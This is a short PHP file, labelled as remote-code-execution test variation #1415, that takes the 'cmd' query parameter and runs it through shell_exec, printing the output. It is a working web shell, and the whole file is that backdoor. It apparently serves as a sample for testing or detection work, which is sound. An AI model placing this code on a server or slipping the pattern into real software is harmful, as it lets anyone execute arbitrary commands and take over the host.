<?php
// RCE test variation #1415
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>